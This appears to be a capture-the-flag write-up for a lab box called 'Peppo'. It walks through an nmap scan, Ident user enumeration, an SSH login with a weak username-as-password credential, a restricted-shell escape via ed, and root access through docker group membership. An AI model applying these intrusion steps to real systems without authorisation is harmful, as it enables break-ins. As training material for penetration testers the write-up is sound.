# Peppo

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.201.60 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-15 11:59 +08
Nmap scan report for 192.168.201.60
Host is up (0.17s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE  SERVICE
22/tcp    open   ssh
113/tcp   open   ident
5432/tcp  open   postgresql
8080/tcp  open   http-proxy
10000/tcp open   snet-sensor-mgmt
```

Port 113 was something new.

### Ident -> SSH

I wanted to enumerate the Ident instance running on port 113 first. We can run `ident-user-enum` to check which users are present:

```
$ ident-user-enum 192.168.201.60 22 113 5432 8080 10000
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

192.168.201.60:22       root
192.168.201.60:113      nobody
192.168.201.60:5432     <unknown>
192.168.201.60:8080     <unknown>
192.168.201.60:10000    eleanor
```

`eleanor` was one of the users. I just tried some weak credentials, and it turns out `eleanor` was the SSH password.&#x20;

<figure><img src="../../../.gitbook/assets/image (1270).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Shell Escape

`id` doesn't work for some reason, so we can check our `$PATH` variable:

```
eleanor@peppo:~$ echo $PATH
/home/eleanor/bin
eleanor@peppo:~$ ls /home/eleanor/bin
chmod  chown  ed  ls  mv  ping  sleep  touch
```

We cannot change the `$PATH` environment variable:

```
eleanor@peppo:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
-rbash: PATH: readonly variable
```

However, we can use `ed` to spawn a better shell and change this.&#x20;

<figure><img src="../../../.gitbook/assets/image (3084).png" alt=""><figcaption></figcaption></figure>

### Docker Group -> Root

The user is part of the `docker` group, which means we can easily get `root`. First check the images present:

```
$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
redmine             latest              0c8429c66e07        3 years ago         542MB
postgres            latest              adf2b126dda8        3 years ago         313MB
```

I'll use `redmine` for the exploit to spawn a `root` shell:

<figure><img src="../../../.gitbook/assets/image (3101).png" alt=""><figcaption></figcaption></figure>
